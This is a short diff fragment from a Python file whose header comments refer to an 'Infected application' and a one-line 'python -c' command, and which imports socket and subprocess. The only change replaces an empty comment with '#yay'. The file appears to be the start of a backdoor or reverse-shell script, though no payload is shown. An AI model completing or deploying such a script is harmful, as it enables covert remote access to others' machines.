@@ -3,7 +3,7 @@
 #Single line python command using 'python -c %X'
 #Infected application
 #?
-#
+#yay
 ########
 import socket
 import subprocess
